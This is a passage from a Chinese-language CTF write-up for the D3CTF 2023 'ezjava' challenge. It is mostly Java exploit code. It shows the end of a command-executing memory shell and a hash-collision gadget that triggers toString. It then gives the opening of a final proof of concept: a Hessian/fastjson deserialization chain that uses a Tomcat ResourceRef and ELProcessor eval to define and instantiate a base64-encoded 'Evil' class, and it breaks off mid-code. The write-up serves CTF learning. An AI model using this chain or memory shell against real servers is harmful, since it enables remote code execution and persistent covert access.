</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>InputStream</span><span class=w> </span><span class=n>input</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>int</span><span class=w> </span><span class=n>n</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>buffer</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=kt>byte</span><span class=o>[</span><span class=n>1024</span><span class=o>]</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>while</span><span class=w> </span><span class=p>((</span><span class=n>n</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>input</span><span class=p>.</span><span class=na>read</span><span class=p>(</span><span class=n>buffer</span><span class=p>))</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=o>-</span><span class=n>1</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=s>&#34;\n&#34;</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>input</span><span class=p>.</span><span class=na>close</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>打入内存马</p><p><img src=/p/d3ctf-2023-ezjava/5.png width=1538 height=916 loading=lazy alt=img></p><p>访问<code>/blacklist/jdk/get</code>发现每次黑名单都会变，然后再访问两次<code>http://server:8080/status</code>，如果是访问了四次就是两次回显，这里我没用冰蝎去连，不方便，但是结果是一样的</p><p><img src=/p/d3ctf-2023-ezjava/6.png width=1862 height=640 loading=lazy alt=img></p><h2 id=exp2>exp2</h2><p>在一开始分析 jar 包的时候总看到 Result.class</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>com.example.registry.data</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=cm>/* loaded from: registry-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/registry/data/Result.class */</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Result</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>message</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>Result</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>message</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>message</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>code</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>code</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=n>Result</span><span class=w> </span><span class=nf>of</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>message</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Result</span><span class=p>(</span><span class=n>code</span><span class=p>,</span><span class=w> </span><span class=n>message</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getMessage</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>message</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setMessage</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>message</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>message</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>message</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>getCode</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>code</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setCode</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>this</span><span class=p>.</span><span class=na>code</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>code</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>equals</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=k>this</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>o</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>||</span><span class=w> </span><span class=n>getClass</span><span class=p>()</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>o</span><span class=p>.</span><span class=na>getClass</span><span class=p>())</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>toString</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>o</span><span class=p>.</span><span class=na>toString</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>toString</span><span class=p>()</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>code</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>message</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>他这里可以触发 toString 方法，不过要比较两个类是否相等，还是经典的碰撞方法</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>Result</span><span class=w> </span><span class=n>result1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Result</span><span class=p>(</span><span class=s>&#34;aaa&#34;</span><span class=p>,</span><span class=s>&#34;bbb&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Result</span><span class=w> </span><span class=n>result2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Result</span><span class=p>(</span><span class=s>&#34;a&#34;</span><span class=p>,</span><span class=s>&#34;b&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>result2</span><span class=p>,</span><span class=s>&#34;message&#34;</span><span class=p>,</span><span class=n>jsonObject</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>map1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>HashMap</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>map2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>map1</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;yy&#34;</span><span class=p>,</span><span class=w> </span><span class=n>result1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>map1</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;zZ&#34;</span><span class=p>,</span><span class=w> </span><span class=n>result2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>map2</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;zZ&#34;</span><span class=p>,</span><span class=w> </span><span class=n>result1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>map2</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=s>&#34;yy&#34;</span><span class=p>,</span><span class=w> </span><span class=n>result2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Hashtable</span><span class=o>&lt;</span><span class=n>Object</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>table</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hashtable</span><span class=o>&lt;&gt;</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>map1</span><span class=p>,</span><span class=w> </span><span class=s>&#34;1&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>table</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>map2</span><span class=p>,</span><span class=w> </span><span class=s>&#34;2&#34;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>或者这样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource1</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=n>result1</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>HotSwappableTargetSource</span><span class=w> </span><span class=n>targetSource2</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HotSwappableTargetSource</span><span class=p>(</span><span class=n>result2</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>HashMap</span><span class=w> </span><span class=n>hashMap</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>HashMap</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource1</span><span class=p>,</span><span class=w> </span><span class=s>&#34;111&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>hashMap</span><span class=p>.</span><span class=na>put</span><span class=p>(</span><span class=n>targetSource2</span><span class=p>,</span><span class=w> </span><span class=s>&#34;222&#34;</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>最终的poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.alibaba.fastjson.JSONObject</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Input</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Output</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.apache.naming.ResourceRef</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.aop.target.HotSwappableTargetSource</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.CannotProceedException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.StringRefAddr</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.naming.directory.DirContext</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayInputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Constructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.net.URLEncoder</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.HashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Hashtable</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>Exp2</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ClassPool</span><span class=w> </span><span class=n>pool</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ClassPool</span><span class=p>.</span><span class=na>getDefault</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>//CtClass clazz = pool.get(SpringInterceptorBehinderForEzJava.class.getName());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>CtClass</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>pool</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>Evil</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getName</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>clazz</span><span class=p>.</span><span class=na>setName</span><span class=p>(</span><span class=s>&#34;Evil&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>clazz_base64</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>clazz</span><span class=p>.</span><span class=na>toBytecode</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>code</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64(&#39;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>clazz_base64</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;&#39;);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;var method = java.lang.ClassLoader.class.getDeclaredMethod(&#39;defineClass&#39;, &#39;&#39;.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;method.setAccessible(true);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=s>&#34;clazz.newInstance();&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ResourceRef</span><span class=w> </span><span class=n>ref</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ResourceRef</span><span class=p>(</span><span class=s>&#34;javax.el.ELProcessor&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>,</span><span class=w> </span><span class=s>&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;forceString&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;x=eval&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ref</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>StringRefAddr</span><span class=p>(</span><span class=s>&#34;x&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;\&#34;\&#34;.getClass().forName(\&#34;javax.script.ScriptEngineManager\&#34;).newInstance().getEngineByName(\&#34;JavaScript\&#34;).eval(\&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>code</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;)&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
